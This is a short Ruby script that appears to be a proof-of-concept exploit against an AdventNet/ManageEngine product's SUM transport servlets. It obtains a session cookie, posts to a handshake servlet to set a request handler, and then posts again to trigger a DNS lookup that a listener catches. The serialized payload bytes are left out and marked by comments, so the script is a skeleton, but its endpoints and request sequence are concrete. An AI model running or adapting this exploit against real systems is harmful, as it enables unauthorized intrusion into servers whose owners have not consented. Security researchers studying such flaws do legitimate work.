require 'typhoeus'
require 'optparse'

def _make_request(uri, cookie = nil, body = nil)
  Typhoeus::Request.new(
    uri,
    method: :post,
    headers: {
      'Cookie' => cookie,
      'Content-Type' => 'application/octet-stream'
    },
    body: body
  ).run
end

target = '127.0.0.1'

puts '[*] Firing off request to obtain a session cookie.'
r = _make_request("#{target}/servlets/com.adventnet.tools.sum.transport.SUMCommunicationServlet")
cookie = r.headers['Set-Cookie']&.scan(/(JSESSIONID=\w+)/)&.flatten&.first

if cookie.nil? 
  p '[-] ERROR retrieving cookie; is the target correct? Aborting.'
  return
end

puts "[+] Obtained the following session cookie: #{cookie}"
puts '[*] Firing off request to set the requesthandler in the session cookie.'
_make_request("#{target}/servlets/com.adventnet.tools.sum.transport.SUMHandShakeServlet", cookie, nil) # <- serialized 1002 here)
puts '[*] Firing off request to invoke the DNS Lookup; check your listener.'
_make_request("#{target}/servlets/com.adventnet.tools.sum.transport.SUMCommunicationServlet", cookie, nil) # <- length of serialized payload in bytes array + payload here